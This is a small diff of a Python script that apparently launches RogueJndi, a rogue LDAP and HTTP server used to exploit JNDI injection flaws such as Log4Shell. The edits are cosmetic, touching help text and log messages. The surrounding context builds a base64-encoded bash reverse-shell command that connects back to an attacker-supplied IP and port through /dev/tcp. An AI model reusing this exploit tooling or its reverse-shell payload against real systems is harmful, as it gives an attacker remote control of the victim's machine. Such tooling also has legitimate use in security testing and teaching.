@@ -44,7 +44,7 @@ def parse_args() -> argparse.Namespace:
         "-j",
         "--jar",
         action="store",
-        help="Path to RogueJndi-1.1.jar",
+        help="Path to RogueJndi-1.1.jar.",
         dest="jar",
     )
 
@@ -54,7 +54,7 @@ def parse_args() -> argparse.Namespace:
 def start_rouge_jndi(args: argparse.Namespace) -> None:
     # Check for RougeJndi jar existence
     if not Path(args.jar).exists():
-        print("RougeJndi-1.1.jar not found.", file=sys.stderr)
+        print("RougeJndi-1.1.jar not found", file=sys.stderr)
         print("See README.md for more information", file=sys.stderr)
         sys.exit(1)
 
@@ -64,7 +64,7 @@ def start_rouge_jndi(args: argparse.Namespace) -> None:
         f"bash -c bash -i >&/dev/tcp/{args.ip}/{args.port} 0>&1".encode("utf-8")
     ).decode("utf-8")
 
-    print("Starting LDAP server")
+    print("Starting HTTP and LDAP server")
     subprocess.Popen(
         [
             "timeout",
